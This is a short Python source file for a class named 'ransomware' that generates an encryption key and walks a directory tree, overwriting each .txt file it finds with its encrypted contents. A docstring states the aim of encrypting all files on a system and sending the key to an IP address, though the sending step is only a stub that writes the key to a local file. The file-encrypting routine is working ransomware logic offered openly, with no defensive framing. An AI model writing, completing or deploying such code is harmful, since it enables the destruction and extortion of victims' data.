import os
from cryptography.fernet import Fernet
class ransomware(object):
    """
    this will encrypt all files in your system
    and send keys to specific ip address
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def send_key(self):
        """
        send key somehow!
        """
        with open("keyfile",'wb+') as f:
            f.write(self.key)
    
    def encrypt(self,data):
        return self.cryptor.encrypt(data)

    def decrypt(self,data):
        return self.cryptor.decrypt(data)

    def path_traversal(self,path):
        for root, _, files in os.walk(path):
            for name in files:
                yield(os.path.join(root,name))

    def fileextcheck(self,path):
        for file in self.path_traversal(path):
            if file.split(".")[-1] != "txt":
                continue
            with open(file,"rb+") as f:
                data = f.read()
                f.seek(0)
                f.truncate()
                f.write(self.encrypt(data))


def test():
    with open("datafile.txt", 'w') as f:
        f.write("what is this ? ")

    with open("datafile.txt", "rb+") as f:
        data = f.read()
        f.seek(0)
        f.truncate()
        f.write(rware.encrypt(data))

    with open("datafile.txt", "rb+") as f:
        data = f.read()
        f.seek(0)
        f.truncate()
        f.write(rware.decrypt(data))

if __name__ == "__main__":
    rware = ransomware()
    rware.send_key()
    
